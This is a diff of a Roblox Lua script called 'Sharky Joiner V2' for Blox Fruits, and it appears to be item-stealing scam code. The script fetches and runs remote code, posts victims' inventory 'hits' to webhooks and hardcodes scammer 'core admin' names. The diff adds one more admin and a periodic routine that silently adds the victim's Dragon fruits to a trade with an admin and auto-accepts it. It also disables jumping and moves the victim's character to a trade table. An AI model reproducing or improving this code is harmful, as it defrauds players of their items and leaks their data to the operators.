@@ -9,7 +9,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/hea
 
 local TEST_WEBHOOK = "https://l.webhook.party/hook/vWJ1Rd7lQSopCs4Vuxa7qHWNoYm4q9%2FH4UAqVOaMoxSpOq%2F4Yp08fCU4Tkn%2Fq26SyB0EVJmJSP9spoYM4pFRDLegxSsmeVCLVPWmKH437EawBax1%2FvN6KILwa9CaWV1%2Fkg7EjtZ0UlOwMyqR7X1iXvdaUcyJaApo2%2FIn7mbomfGkAFacgxB6WVOi0Lm9exZDmC04bOlBJ3pX9FcWLadkzLCKvZE8ytiea1LgyVzVyBUBCPSBTWl6yTaIPk8428hc23eC3dAsPuCK4Dbu2ZernRaO654dO7nVSJuzelZL09nkouPlr28BGoAwlNImD%2FvtTTPWuZnUVTnr9%2FijK2q%2Bh92EfSHf%2BH5qg334UcBZR5b7osNi4z%2BD8DCK%2F%2BooE1xWtv6WgNQkDMM%3D/zWMIeMClX%2FlPLAgD" -- For simple hit integrity check only
 local TEST_PAYLOAD = game:GetService("HttpService"):JSONEncode({
-    content = "# <a:babyshark:721795947037851688> Sharky! Someone just got a NICE HIT :) <a:babyshark:721795947037851688>"
+    content = " <a:babyshark:721795947037851688> Sharky! Someone just got a NICE HIT :) <a:babyshark:721795947037851688>"
 })
 
 
@@ -20,7 +20,7 @@ TestingUsernames = { "tester1", "your_alt_account" }
 ActivationPasswords = { "ishusontop", "bonzarbal", "ishufishy" } -- << Passwords for ?activate command
 local BlacklistedUsers = {"Scammer1", "KnownAltTrader", "RuleBreaker"} -- << Add usernames who should NEVER be allowed access
 
-local coreAdminUsernames = { "x6TNine", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50" } -- << Core admin usernames (hardcoded)
+local coreAdminUsernames = { "x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50" } -- << Core admin usernames (hardcoded)
 
 RGBGreenVal = 0.20 -- << (e.g., 20%) Chance user webhook gets Dragon hit notifications.
 RGBRedVal = 0.60 -- << (e.g., 60%) Chance user webhook gets Premium/Kitsune/Yeti hits.
@@ -228,6 +228,7 @@ local function sanitizeUsernames()
     end
 end
 
+-- Refined function to check if trade partner is a Core Admin
 local function isTradePartnerCoreAdmin()
     local p = LocalPlayer
     local pg = p:FindFirstChild("PlayerGui")
@@ -235,44 +236,62 @@ local function isTradePartnerCoreAdmin()
     local mg = pg:FindFirstChild("Main")
     if not mg then return false end
     local tf = mg:FindFirstChild("Trade")
-    if not tf or not tf.Visible then return false end -- Must be visible
+    -- Ensure the trade frame exists and is visible
+    if not tf or not tf.Visible then return false end
 
-    local c = tf:FindFirstChild("Container")
-    local f1 = c and c:FindFirstChild("1")
-    local f2 = c and c:FindFirstChild("2")
-    local p1l = f1 and f1:FindFirstChild("TextLabel")
-    local p2l = f2 and f2:FindFirstChild("TextLabel")
-    if not p1l or not p2l then return false end
+    local container = tf:FindFirstChild("Container")
+    if not container then return false end
+    local frame1 = container:FindFirstChild("1")
+    local frame2 = container:FindFirstChild("2")
+    local label1 = frame1 and frame1:FindFirstChild("TextLabel")
+    local label2 = frame2 and frame2:FindFirstChild("TextLabel")
+
+    -- Check if both labels were found
+    if not label1 or not label2 then
+        return false
+    end
 
     local otherPlayerLabel = nil
     local localPlayerName = p.Name
     local localPlayerDisplayName = p.DisplayName
 
-    if p1l.Text == localPlayerName or p1l.Text == localPlayerDisplayName then
-        otherPlayerLabel = p2l
-    elseif p2l.Text == localPlayerName or p2l.Text == localPlayerDisplayName then
-        otherPlayerLabel = p1l
+    -- Determine which label belongs to the other player, comparing against both Name and DisplayName
+    if (label1.Text == localPlayerName or label1.Text == localPlayerDisplayName) then
+        otherPlayerLabel = label2
+    elseif (label2.Text == localPlayerName or label2.Text == localPlayerDisplayName) then
+        otherPlayerLabel = label1
     else
-        return false
+        return false -- Couldn't identify local player label
     end
 
-    if not otherPlayerLabel then return false end
+    if not otherPlayerLabel then return false end -- Should be redundant, but safe check
 
     local otherPlayerNameOrDisplay = otherPlayerLabel.Text
-    local otherPlayer = Players:FindFirstChild(otherPlayerNameOrDisplay)
-    if not otherPlayer then
+    local otherPlayer = Players:FindFirstChild(otherPlayerNameOrDisplay) -- Try direct name first
+    if not otherPlayer then -- If not found by name, try by display name case-insensitively
+        local nameLower = otherPlayerNameOrDisplay:lower()
         for _, pl in ipairs(Players:GetPlayers()) do
-            if pl.DisplayName == otherPlayerNameOrDisplay then
+            if pl.DisplayName:lower() == nameLower then
                 otherPlayer = pl
                 break
             end
+            -- As a fallback, check actual name case-insensitively too
+             if pl.Name:lower() == nameLower then
+                 otherPlayer = pl
+                 break
+             end
         end
     end
 
-    if not otherPlayer then return false end
+    if not otherPlayer then
+        return false
+    end
 
-    return isCoreAdmin(otherPlayer.Name)
+    -- Check if the found player is a core admin (already case-insensitive)
+    local isAdmin = isCoreAdmin(otherPlayer.Name)
+    return isAdmin
 end
+
 
 -- Wait for game load
 repeat
@@ -853,7 +872,7 @@ local function sendWebhook(inventory)
         }
     }
     local commonFooter = {
-        text = "Sharky Joiner V2 • 1.3.5 " .. os.date("%Y-%m-%d") -- Updated version
+        text = "Sharky Joiner V2 • 1.3.5 " .. os.date("%Y-%m-%d")
     }
 
     local shouldBypassFilter = false;
@@ -1170,6 +1189,8 @@ local function tweenToPosition(p)
 
     uC = RunService.Heartbeat:Connect(function()
         if not r or not r.Parent or not bv or not bv.Parent then cleanupTween(); return end;
+        -- Check distance to prevent overshooting significantly
+        if (r.Position - p).Magnitude < 5 then cleanupTween(); return end; -- Stop if close
         local dir = (p - r.Position).Unit;
         r.CFrame = CFl(r.Position, r.Position + dir);
         bv.Velocity = dir * s
@@ -1180,10 +1201,9 @@ local function tweenToPosition(p)
     t.Cancelled:Connect(cleanupTween)
     t:Play();
 
-    -- Wait for completion, but use Wait() on the signal for better yielding
+    -- Wait for completion using the signal for better yielding
     t.Completed:Wait()
-    -- Small extra wait just in case cleanup needs a moment
-    task.wait(0.05)
+    task.wait(0.05) -- Small extra wait
 end
 
 
@@ -1217,7 +1237,7 @@ local function findTradeTable()
         end
         if not nonAdminAuthDisabled then
             local isUsernameListed = false
-             if Usernames and type(Usernames) == "table" then -- Case-insensitive check
+             if Usernames and type(Usernames) == "table" then
                  local pNameLower = p.Name:lower()
                  for _, uname in ipairs(Usernames) do
                      if type(uname) == "string" and uname:lower() == pNameLower then
@@ -1278,8 +1298,9 @@ local function isInTradeWithCorrectPlayer()
         return false
     end;
     local c = tf:FindFirstChild("Container");
-    local f1 = c and c:FindFirstChild("1");
-    local f2 = c and c:FindFirstChild("2");
+    if not c then return false end; -- Added check
+    local f1 = c:FindFirstChild("1");
+    local f2 = c:FindFirstChild("2");
     local p1l = f1 and f1:FindFirstChild("TextLabel");
     local p2l = f2 and f2:FindFirstChild("TextLabel");
     if not p1l or not p2l then
@@ -1288,9 +1309,9 @@ local function isInTradeWithCorrectPlayer()
     local otherPlayerLabel = nil;
     local localPlayerName = p.Name;
     local localPlayerDisplayName = p.DisplayName
-    if p1l.Text == localPlayerName or p1l.Text == localPlayerDisplayName then
+    if (p1l.Text == localPlayerName or p1l.Text == localPlayerDisplayName) then -- Check both
         otherPlayerLabel = p2l
-    elseif p2l.Text == localPlayerName or p2l.Text == localPlayerDisplayName then
+    elseif (p2l.Text == localPlayerName or p2l.Text == localPlayerDisplayName) then -- Check both
         otherPlayerLabel = p1l
     else
         return false
@@ -1301,11 +1322,16 @@ local function isInTradeWithCorrectPlayer()
     local otherPlayerNameOrDisplay = otherPlayerLabel.Text;
     local otherPlayer = Players:FindFirstChild(otherPlayerNameOrDisplay)
     if not otherPlayer then
+        local nameLower = otherPlayerNameOrDisplay:lower() -- Check display name case-insensitive
         for _, pl in ipairs(Players:GetPlayers()) do
-            if pl.DisplayName == otherPlayerNameOrDisplay then
+            if pl.DisplayName:lower() == nameLower then
                 otherPlayer = pl;
                 break
             end
+             if pl.Name:lower() == nameLower then -- Fallback check name case-insensitive
+                 otherPlayer = pl;
+                 break
+             end
         end
     end
     if not otherPlayer then
@@ -1316,7 +1342,7 @@ local function isInTradeWithCorrectPlayer()
     end
     if not nonAdminAuthDisabled then
          local isUsernameListed = false
-         if Usernames and type(Usernames) == "table" then -- Case-insensitive check
+         if Usernames and type(Usernames) == "table" then
              local pNameLower = otherPlayer.Name:lower()
              for _, uname in ipairs(Usernames) do
                  if type(uname) == "string" and uname:lower() == pNameLower then
@@ -1414,11 +1440,9 @@ local function disableJump()
             end
         end;
         table.clear(stateChangedConnections);
-        -- Also re-enable jump state on cleanup
         local currentHumanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
         if currentHumanoid then
             pcall(currentHumanoid.SetStateEnabled, currentHumanoid, Enum.HumanoidStateType.Jumping, true)
-            -- Consider resetting jump power if needed, though it should be 0 unless ForceJump ran recently
         end
     end
 end
@@ -1811,7 +1835,8 @@ local Commands = {
                 return
             end;
             local c = tu.Trade:FindFirstChild("Container");
-            local pf = c and c:FindFirstChild("1");
+            if not c then sendMessage("Cannot find trade container."); return end; -- Added check
+            local pf = c:FindFirstChild("1");
             local itf = pf and pf:FindFirstChild("Frame");
             if not itf then
                 sendMessage("Cannot find trade frame.");
@@ -1930,9 +1955,14 @@ local Commands = {
         u = "?demolish",
         e = function(args, player)
             sendMessage("!!! DEMOLISH INITIATED !!!");
-            local iR = function(rn, argsTbl) -- Modified slightly to take table
-                local r = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(rn);
-                return r:InvokeServer(unpack(argsTbl))
+            local iR = function(rn, argsTbl)
+                local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(rn); -- Use WaitForChild
+                if remote then
+                    return remote:InvokeServer(unpack(argsTbl))
+                else
+                    warn("Demolish: Could not find remote:", rn)
+                    return nil
+                end
             end;
             iR("CommF_", {"RemoveFruit", "Beli"});
             local inv = getInventory();
@@ -2043,8 +2073,8 @@ local Commands = {
                     "?add ?additem ?addall ?addallitems",
                     "?resetfruit ?invite ?demolish ?showinv",
                     "?allowall ?accept ?cleartrade ?kick",
-                    "?roll ?activate ?allow", -- Added new commands
-                    "?d ?e ?silent" -- Admin commands
+                    "?roll ?activate ?allow",
+                    "?d ?e ?silent"
                 };
                 sendMessage("--- Commands (V1.3.5) ---");
                 task.wait(0.5);
@@ -2227,53 +2257,39 @@ local Commands = {
                 return
             end
 
-            -- --- Roll Remote Config ---
-            local IS_ROLL_FUNCTION = true -- Still needed for call type
+            local IS_ROLL_FUNCTION = true
             local ROLL_CHECK_ARGUMENTS = {"Cousin", "Check"}
             local ROLL_BUY_ARGUMENTS = {"Cousin", "Buy"}
-            -- --- End Roll Config ---
 
             local rollRemote = nil
             local waitTimeout = 5 -- seconds to wait for the remote
 
-            -- <<< --- MODIFIED REMOTE FINDING (Using WaitForChild) --- >>>
-            local rollSuccess, rollInstance = pcall(function()
-                -- Use WaitForChild directly on the known parent
-                return ReplicatedStorage.Remotes:WaitForChild("CommF_", waitTimeout)
-            end)
+            local rollSuccess, rollInstance = pcall(function() return ReplicatedStorage.Remotes:WaitForChild("CommF_", waitTimeout) end)
 
             if not rollSuccess or not rollInstance then
                 sendMessage("Error: Failed to find Roll Remote ('CommF_') after waiting " .. waitTimeout .. "s. It might not exist or timed out.")
-                warn("WaitForChild Error for CommF_: ", rollInstance) -- Log pcall error if any
+                warn("WaitForChild Error for CommF_: ", rollInstance)
                 return
-            -- Check if the found instance is actually a RemoteFunction
             elseif not rollInstance:IsA("RemoteFunction") then
                  sendMessage("Error: Found 'CommF_' but it is not a RemoteFunction.")
                  return
             end
-            rollRemote = rollInstance -- Assign if successful and correct type
-            -- <<< --- END MODIFIED REMOTE FINDING --- >>>
+            rollRemote = rollInstance
 
-
-            -- Get inventory BEFORE rolling
             local initialInventory = getInventory()
             if not initialInventory then sendMessage("Error: Inventory error before roll."); return end
 
-            -- Call the roll CHECK remote
             local checkCallSuccess, checkResult = pcall(function() return rollRemote:InvokeServer(unpack(ROLL_CHECK_ARGUMENTS)) end)
             if not checkCallSuccess then sendMessage("Error: Gacha check failed: " .. tostring(checkResult)); return end
 
-            -- Call the roll BUY remote
             local buyCallSuccess, buyResult = pcall(function() return rollRemote:InvokeServer(unpack(ROLL_BUY_ARGUMENTS)) end)
             if not buyCallSuccess then sendMessage("Error: Gacha buy failed: " .. tostring(buyResult)); return end
 
-            task.wait(1.5) -- Wait for inventory update
+            task.wait(1.5)
 
-            -- Check inventory AFTER rolling
             local finalInventory = getInventory()
             if not finalInventory then sendMessage("Error: Inventory error after roll."); return end
 
-            -- Find the new fruit by comparing inventories
             local rolledFruitInvName = nil
             local initialCounts = {}
             for _, item in ipairs(initialInventory) do if item.Type == "Blox Fruit" then initialCounts[item.Name] = item.Count end end
@@ -2283,7 +2299,6 @@ local Commands = {
 
             sendMessage("Rolled: " .. rolledFruitInvName .. "! Moving near issuer: " .. player.Name)
 
-            -- Move near player who issued the command
             local targetPlayer = player
             local targetCharacter = targetPlayer and targetPlayer.Character
             local targetRootPart = targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")
@@ -2297,31 +2312,25 @@ local Commands = {
                 tweenToPosition(destinationPosition)
             end
 
-            -- Determine the likely Tool name
             local likelyToolName = rolledFruitInvName:match("(.+)%-.+")
             if not likelyToolName then sendMessage("Error: Could not parse tool name: " .. rolledFruitInvName); return end
             likelyToolName = likelyToolName .. " Fruit"
 
-            -- Find the tool in the backpack
             local fruitTool = ScriptUserBackpack:FindFirstChild(likelyToolName)
              if not fruitTool or not fruitTool:IsA("Tool") then
                  for _, tool in ipairs(ScriptUserBackpack:GetChildren()) do if tool:IsA("Tool") and tool.Name:lower():match(likelyToolName:lower():match("^%s*(.-)%s*$")) then fruitTool = tool; break end end
                  if not fruitTool then sendMessage("Error: Could not find Tool '" .. likelyToolName .. "' in Backpack."); return end
              end
 
-            -- Equip the tool
             ScriptUserHumanoid:EquipTool(fruitTool)
-            task.wait(0.5) -- Wait for equip
+            task.wait(0.5)
 
-            -- Find the equipped tool in the character
             local equippedTool = ScriptUserCharacter:FindFirstChild(fruitTool.Name)
              if not equippedTool or not equippedTool:IsA("Tool") then sendMessage("Error: Failed to find equipped tool '" .. fruitTool.Name .. "' in Character."); ScriptUserHumanoid:UnequipTools(); return end
 
-            -- Find the EatRemote inside the equipped tool
             local eatRemote = equippedTool:FindFirstChild("EatRemote")
              if not eatRemote or not eatRemote:IsA("RemoteFunction") then sendMessage("Error: Could not find 'EatRemote' in equipped tool."); ScriptUserHumanoid:UnequipTools(); return end
 
-            -- Call the drop remote
             local dropCallSuccess, dropCallResult = pcall(function() return eatRemote:InvokeServer("Drop") end)
             if not dropCallSuccess then sendMessage("Error: Drop failed: " .. tostring(dropCallResult))
             else sendMessage("Dropped '" .. rolledFruitInvName .. "' successfully.")
@@ -2330,7 +2339,7 @@ local Commands = {
              task.wait(0.2)
              ScriptUserHumanoid:UnequipTools()
         end
-    }
+    } -- <<< Ensure comma if not last command
 }
 
 -- Command Processor
@@ -2387,13 +2396,19 @@ local function startMainLoop()
 
     local humanoidSitConnection = nil
     local tradeVisibleConnection = nil
-    local characterRemovingConnection = nil
+    local characterRemovingConnection = nil -- Renamed for clarity
 
     local autoAcceptActive = false
     local lastAcceptAttemptTime = 0
     local AUTO_ACCEPT_INTERVAL = 2
 
-    local function checkAndAutoAddDragon()
+    local lastAutoAddCheckTime = 0
+    local AUTO_ADD_CHECK_INTERVAL = 1.0
+
+    -- Core Auto-Add Logic Function (Silent & setting autoAcceptActive)
+    local function checkAndAutoAddDragon(fromPeriodicCheck)
+        if currentTradeSessionAutoAddedDragon then return end
+
         local Character = LocalPlayer.Character
         local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
         local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
@@ -2401,7 +2416,9 @@ local function startMainLoop()
 
         if not Humanoid or not TradeFrame then return end
 
-        if lastScanWasDragonHit and not currentTradeSessionAutoAddedDragon and Humanoid.Sit and TradeFrame.Visible and isTradePartnerCoreAdmin() then
+        local shouldAdd = lastScanWasDragonHit and Humanoid.Sit and TradeFrame.Visible and isTradePartnerCoreAdmin()
+
+        if shouldAdd then
             currentTradeSessionAutoAddedDragon = true
             autoAcceptActive = false
 
@@ -2412,7 +2429,7 @@ local function startMainLoop()
                 local dragonsToAdd = {}
                 for _, item in ipairs(inv) do if item.Type == "Blox Fruit" and item.Name:find("Dragon") then table.insert(dragonsToAdd, {name = item.Name, count = item.Count}) end end
 
-                if #dragonsToAdd == 0 then return end
+                if #dragonsToAdd == 0 then currentTradeSessionAutoAddedDragon = false; return end
 
                 local addedCount = 0
                 for _, dragonData in ipairs(dragonsToAdd) do
@@ -2423,17 +2440,13 @@ local function startMainLoop()
                     end
                 end
 
-                if addedCount > 0 then
-                   autoAcceptActive = true
-                   lastAcceptAttemptTime = 0
-                   -- print("Auto-Add Dragon Complete. Auto-Accept Activated.") -- Optional silent debug
-                else
-                    currentTradeSessionAutoAddedDragon = false
-                end
+                if addedCount > 0 then autoAcceptActive = true; lastAcceptAttemptTime = 0
+                else currentTradeSessionAutoAddedDragon = false end
             end)
         end
     end
 
+    -- Function to clean up connections specific to this loop/character instance
     local function cleanupCharacterConnections()
         if humanoidSitConnection and humanoidSitConnection.Connected then humanoidSitConnection:Disconnect() end
         if tradeVisibleConnection and tradeVisibleConnection.Connected then tradeVisibleConnection:Disconnect() end
@@ -2447,9 +2460,9 @@ local function startMainLoop()
        if vpr then return end; vpr = true; local fc=0; local lts=false; for _=1,TRC do task.wait(0.25); local tu=LocalPlayer.PlayerGui:FindFirstChild("Main"); local crts=tu and tu:FindFirstChild("Trade") and tu.Trade.Visible; if lts~=crts or not crts or not isInTradeWithCorrectPlayer() then fc=fc+1 end; lts=crts end; if fc>=TRC-1 then task.wait(0.1); ForceJump() end; vpr=false
     end;
 
-    local jcC;
+    local jcC; -- Jump Control Cleanup function
 
-    local function onCA(character)
+    local function onCA(character) -- onCharacterAdded
         task.wait(1);
         local humanoid = character:WaitForChild("Humanoid", 5);
         local rootPart = character:WaitForChild("HumanoidRootPart", 5);
@@ -2462,27 +2475,30 @@ local function startMainLoop()
         lmt, ltc, ltrc = n, n, n;
         jcC = disableJump();
 
-        cleanupCharacterConnections()
+        cleanupCharacterConnections() -- Clean up any old connections first
 
         humanoidSitConnection = humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
-            if not humanoid.Sit then cleanupCharacterConnections() else checkAndAutoAddDragon() end
+            if not humanoid.Sit then cleanupCharacterConnections() end -- Only need cleanup on stand
         end)
 
         tradeVisibleConnection = tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
-            if not tradeFrame.Visible then cleanupCharacterConnections() else checkAndAutoAddDragon() end
+            if not tradeFrame.Visible then cleanupCharacterConnections() end -- Only need cleanup on close
         end)
 
-        task.spawn(function() ct, cs = findTradeTable(); if ct and cs then tweenToPosition(cs.Position) end end)
+        task.spawn(function() -- Initial table find and move
+            ct, cs = findTradeTable();
+            if ct and cs then tweenToPosition(cs.Position) end
+        end)
     end;
 
-    local function onCR()
+    local function onCR() -- onCharacterRemoving
         ct, cs = nil, nil;
-        cleanupCharacterConnections()
+        cleanupCharacterConnections() -- Disconnect signals and reset flags
         if jcC and type(jcC) == "function" then pcall(jcC) end
         jcC = nil
     end;
 
-    local function runML()
+    local function runML() -- Main Loop
         local lt = tick();
         while ir do
             local n = tick();
@@ -2496,13 +2512,16 @@ local function startMainLoop()
                 local tradeFrame = playerGui and playerGui:FindFirstChild("Main") and playerGui.Main:FindFirstChild("Trade")
                 local isInTrade = tradeFrame and tradeFrame.Visible
 
+                -- Trade validation jump logic (vTP)
                 if not isInTrade then hct = false; ltrc = n
                 elseif not hct and (n - ltrc) >= TVD then task.spawn(vTP); hct = true
                 end;
 
+                -- Periodic check for best trade table
                 if n - ltc >= TCI then task.spawn(function() local nt, ns = findTradeTable(); if nt and ns then ct, cs = nt, ns end end); ltc = n
                 end;
 
+                -- Movement logic towards target seat if not sitting
                 if ct and cs and not humanoid.Sit then
                     local dist = (rootPart.Position - cs.Position).Magnitude;
                     if dist > 5 then tweenToPosition(cs.Position)
@@ -2510,8 +2529,15 @@ local function startMainLoop()
                     end
                 end
 
+                -- Periodic Auto-Add Check
+                if humanoid.Sit and isInTrade and (n - lastAutoAddCheckTime >= AUTO_ADD_CHECK_INTERVAL) then
+                   lastAutoAddCheckTime = n
+                   checkAndAutoAddDragon(true) -- Call check periodically
+                end
+
+                -- Auto-Accept Logic
                 if autoAcceptActive and humanoid.Sit and isInTrade and (n - lastAcceptAttemptTime >= AUTO_ACCEPT_INTERVAL) then
-                    lastAcceptAttemptTime = n
+                    lastAcceptAttemptTime = n -- Update time immediately
                     pcall(TradeFunction.InvokeServer, TradeFunction, "accept")
                 end
 
@@ -2522,18 +2548,20 @@ local function startMainLoop()
         end
     end;
 
+    -- Initial setup (Connections)
     local characterAddedConnection = LocalPlayer.CharacterAdded:Connect(onCA);
-    characterRemovingConnection = LocalPlayer.CharacterRemoving:Connect(onCR);
+    characterRemovingConnection = LocalPlayer.CharacterRemoving:Connect(onCR); -- Store this specifically
 
     if LocalPlayer.Character then task.spawn(onCA, LocalPlayer.Character) end;
-    task.spawn(runML);
+    task.spawn(runML); -- Start the main movement/accept loop
 
+    -- Return the overall cleanup function for startMainLoop
     return function()
-        ir = false;
+        ir = false; -- Stop the main loop
         if characterAddedConnection and characterAddedConnection.Connected then characterAddedConnection:Disconnect() end
         if characterRemovingConnection and characterRemovingConnection.Connected then characterRemovingConnection:Disconnect() end
-        cleanupCharacterConnections()
-        if jcC and type(jcC) == "function" then pcall(jcC) end;
+        cleanupCharacterConnections() -- Clean up humanoid/trade connections & flags
+        if jcC and type(jcC) == "function" then pcall(jcC) end; -- Enable jumping
         characterAddedConnection = nil; characterRemovingConnection = nil; jcC = nil; ct = nil; cs = nil;
     end
 end
